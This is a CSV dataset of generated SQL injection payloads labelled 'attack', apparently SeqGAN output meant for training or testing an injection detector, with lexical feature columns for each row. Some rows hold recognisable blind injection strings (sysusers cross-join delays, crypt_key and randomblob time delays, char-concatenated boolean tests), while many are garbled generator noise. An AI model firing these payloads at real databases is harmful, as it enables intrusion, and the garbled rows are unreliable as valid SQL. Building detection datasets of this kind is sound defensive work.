label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"-8919'  =  'drg""  =  ""1q""  =  ""yx=   )    )   3580h  ( 6671    (  Zconw or t(  select x  char  , ex(  =ypp_upexxp  =  3862  (  122 ( and coubl_t_uprdbmb  culrchar  b  99  )  = 8691  (  ="" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and "" a 6093  =  =  3880 3580  (  =  6849  where  (  67 or 4018 or (  *    or where 6503 2832  (  =  2027(  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1214,622.0,43.0,3.733575731965917,159.0,106.0,271.0,86.0,0.25562700964630225,0.17041800643086816,0.43569131832797425,0.1382636655948553,2.0,6.0,1.0,0.0,1.0,13.0,0.0,49.0,0.0,3.0,1.0,25.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,0.0,2.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0,0.0,0.0,0.0,24.0
attack,1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1215,67.0,27.0,3.712041314696648,18.0,13.0,26.0,10.0,0.26865671641791045,0.19402985074626866,0.3880597014925373,0.14925373134328357,4.0,0.0,0.0,0.0,0.0,3.0,0.0,2.0,1.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%%""  =  ""null  65  select   (  =  66  =  =  1441  =  100  (  0x7171706a71,  =  6849  )  aht  =  =  5485 3880  ||q  =  select--p_ 3880pc_ 'unusual'  yp_up_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1216,155.0,33.0,4.020849285745251,36.0,38.0,54.0,27.0,0.23225806451612904,0.24516129032258063,0.34838709677419355,0.17419354838709677,2.0,2.0,2.0,0.0,0.0,9.0,0.0,3.0,2.0,4.0,1.0,13.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""   8518ep_ =  rexp_unxp  =  =  2642epp  =  4018 3352    (  2642      (  =  2027  ==  hpdomns recablepers asetcuseromaint",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1217,122.0,31.0,4.038445719450962,46.0,25.0,39.0,12.0,0.3770491803278688,0.20491803278688525,0.319672131147541,0.09836065573770492,0.0,1.0,0.0,0.0,0.0,7.0,0.0,2.0,0.0,2.0,0.0,7.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1   '   where 6388 where 6671  =  =  (  )  =  =_=  2027  =  char  *  (  113  =  4018  =  (  ||charex  (  =  (  =    =  113  select 6503  ex  2961 3352 from 2180  =    = 9643  6388 where 8446744073709551610 6849  rexp_g   ,ptctaptdkedont  =     ap  =  =  (  =  (     (  ,  (  char  =  =  =     * or 6503  =  =  = 2724 7522 ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1218,322.0,37.0,3.7141566405059177,64.0,82.0,134.0,42.0,0.19875776397515527,0.2546583850931677,0.4161490683229814,0.13043478260869565,1.0,0.0,0.0,0.0,2.0,23.0,0.0,10.0,0.0,2.0,2.0,27.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,8.0
attack,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  't,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1219,76.0,16.0,2.5673384841755853,7.0,13.0,44.0,12.0,0.09210526315789473,0.17105263157894737,0.5789473684210527,0.15789473684210525,2.0,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1220,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1"" where 6849  =   =    2961ex  (  (  101pahtrh  =ex  (  =  =  5485ys  =  =  1441    (  =  (  (  ileft  =  =  =  6388 char  =  char  7793  =  122  2961  =  (  =    =  *    (  1048 *  (  selecttc(  ragep_upl_ull_up_systys t4ableft  (  2180  =  ""dskh""  =  (  rdr_s i   a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1221,268.0,35.0,3.7656469000601813,74.0,44.0,110.0,40.0,0.27611940298507465,0.16417910447761194,0.41044776119402987,0.14925373134328357,0.0,3.0,0.0,0.0,2.0,18.0,0.0,12.0,0.0,5.0,0.0,20.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,3.0
attack,"1'7555,8899  2724sus and   )    =    (  rs where where char  =thenup_upt  =  =  where or do( andt_usibll_us t5  (  (  69  rionstaiblep_usibsin.fkefefdpl_ll_upasiss teperioublesepersyus t2s t2,%e  =     (  =  char  =  =  (  1441  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1222,229.0,36.0,4.287683126777081,118.0,22.0,63.0,26.0,0.5152838427947598,0.09606986899563319,0.27510917030567683,0.11353711790393013,1.0,0.0,0.0,0.0,0.0,8.0,0.0,7.0,1.0,6.0,2.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,7.0
attack,1'--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1223,4.0,3.0,1.5,0.0,1.0,0.0,3.0,0.0,0.25,0.0,0.75,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   whereyp_paerdgexpe 7793L  = 4799 concaterxh_u(  8571 doblt  (  =p  =    =  =_ rep_smaibsyst all_us aiolant(  (  (  105  r  (  rep_maolussat--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1224,146.0,35.0,4.367470418727334,72.0,16.0,38.0,20.0,0.4931506849315068,0.1095890410958904,0.2602739726027397,0.136986301369863,0.0,1.0,2.0,0.0,0.0,5.0,0.0,6.0,0.0,6.0,0.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1   r'  =  'bcr'  =  'domasinwmz'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1225,241.0,34.0,3.6282808290957504,125.0,12.0,76.0,28.0,0.5186721991701245,0.04979253112033195,0.3153526970954357,0.11618257261410789,6.0,2.0,0.0,0.0,1.0,4.0,0.0,8.0,1.0,0.0,6.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '""  =  ""-l4873)puomn.ayseint_krs t_usyrsio    atasyseril_ussas t1,rl_usmas  lumas t1,sstabo where _ x  6671 3880    (  lect2_suserys 6503 astrfgexp_( char  (  5485  =  1541pz  =  (  =  or 2180  (  (  r 3038  (  (  =    8691  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1226,949.0,46.0,3.8381086664754562,296.0,120.0,399.0,134.0,0.3119072708113804,0.12644889357218125,0.4204425711275026,0.14120126448893572,2.0,4.0,1.0,0.0,0.0,9.0,0.0,81.0,0.0,9.0,7.0,30.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,20.0,0.0,0.0,0.0,30.0
attack,"1'  )   and 8148  =  like  (  'char  ) or 2774  (  =  =  *  (  (  2961  |myp_subsys as abdbll_um.dexp_left  (  (  80ex rhrtp_t al_rlesys at5  )  3880  =  from t2,del_umasetiolabl_kubld_ufs as reft_usstas t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1227,213.0,41.0,4.384633878813239,99.0,22.0,61.0,31.0,0.4647887323943662,0.10328638497652583,0.2863849765258216,0.14553990610328638,2.0,0.0,2.0,0.0,1.0,4.0,0.0,10.0,0.0,9.0,1.0,8.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,4.0
attack,"1')    a   (  (  4018(  =  =  =  =  ||r  (  es 4018 or 7555  =  5485  =  2774 3862 2961 or ep_s 7417  (  =  6093  (  6671 ep  (  106  _rt_uptales aperege3393_up_s t2,rtt  =  6388  iex  (  =  =  1541L(  as a(  (  =  =  =    (  =  1087 t  1087 8691  (  select d  122  =  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1228,269.0,33.0,3.7103468283212804,51.0,72.0,108.0,38.0,0.1895910780669145,0.26765799256505574,0.40148698884758366,0.1412639405204461,1.0,0.0,0.0,0.0,0.0,15.0,0.0,14.0,0.0,5.0,1.0,17.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '/*""  =  ""ver  = or where   (   =  3880 7522  =  3393  (  3393  =  (e'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'  (  h  (  =  = char  =  (  =  fint_kere_up    in.  (  6503 1668  (  2724 2961    o  =  69  t  =  =  =  (  =  =  (  1541  =  char  3393  =  =_pp_s tas  t  (  (  =  =  = 4 _)    )    --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1229,508.0,45.0,4.008955151874074,192.0,65.0,181.0,70.0,0.3779527559055118,0.1279527559055118,0.3562992125984252,0.1377952755905512,4.0,2.0,2.0,1.0,2.0,22.0,0.0,20.0,0.0,5.0,6.0,31.0,1.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,11.0
attack,"1 ""   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1230,8.0,4.0,1.75,0.0,1.0,4.0,3.0,0.0,0.125,0.5,0.375,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""ebdbfg'  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1231,361.0,44.0,3.746820635682463,113.0,35.0,156.0,57.0,0.31301939058171746,0.09695290858725762,0.43213296398891965,0.15789473684210525,1.0,2.0,2.0,0.0,0.0,1.0,0.0,34.0,1.0,2.0,4.0,13.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,10.0
attack,1%%' like '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1232,19.0,9.0,2.7603136973125113,4.0,1.0,6.0,8.0,0.21052631578947367,0.05263157894736842,0.3157894736842105,0.42105263157894735,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'regll_uzm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1233,365.0,32.0,3.6140419497680516,230.0,23.0,82.0,30.0,0.6301369863013698,0.06301369863013699,0.22465753424657534,0.0821917808219178,4.0,0.0,0.0,0.0,2.0,2.0,0.0,8.0,1.0,1.0,12.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1234,351.0,36.0,3.6186899086358646,93.0,45.0,150.0,63.0,0.26495726495726496,0.1282051282051282,0.42735042735042733,0.1794871794871795,0.0,4.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,3.0,0.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'abdz",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1235,244.0,37.0,3.7923065177515585,78.0,29.0,96.0,41.0,0.319672131147541,0.11885245901639344,0.39344262295081966,0.1680327868852459,2.0,0.0,0.0,0.0,0.0,1.0,0.0,22.0,0.0,2.0,4.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,9.0
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '""'  =  'dblg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1236,290.0,37.0,3.7227336068614165,81.0,37.0,122.0,50.0,0.2793103448275862,0.12758620689655173,0.4206896551724138,0.1724137931034483,6.0,3.0,0.0,1.0,0.0,3.0,0.0,25.0,1.0,1.0,4.0,10.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,8.0
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  "",sshtzw' or ''  )   as juxt where 5956  =  5956 and 8148  =  like  (  'aberdgm""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1237,447.0,39.0,3.5896341144398414,128.0,59.0,197.0,63.0,0.28635346756152125,0.1319910514541387,0.4407158836689038,0.14093959731543623,4.0,4.0,0.0,0.0,0.0,5.0,0.0,38.0,0.0,0.0,2.0,15.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,20.0
attack,"-_ass t1b  (  6849 3862  =       (  (  =  hp    (  a char  4018  (  =  =  (    char  =  7555  (  =    (      =  3393ex  (   ry  (  where 2642et  (   s 6671  =  =  5389     2961  =  2027 _ 8691  (  ,p_s rsbl_,afins t5  repexpp_uouyptt  (  =  2180 or 2642 _upp_lin.dom",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1238,266.0,37.0,3.7864013763612308,65.0,54.0,112.0,35.0,0.24436090225563908,0.20300751879699247,0.42105263157894735,0.13157894736842105,0.0,0.0,1.0,0.0,0.0,11.0,0.0,13.0,0.0,7.0,2.0,12.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,4.0
attack,1%%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1239,3.0,2.0,0.9182958340544896,0.0,1.0,0.0,2.0,0.0,0.3333333333333333,0.0,0.6666666666666666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1240,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%%%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1241,12.0,5.0,2.084962500721156,0.0,1.0,4.0,7.0,0.0,0.08333333333333333,0.3333333333333333,0.5833333333333334,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
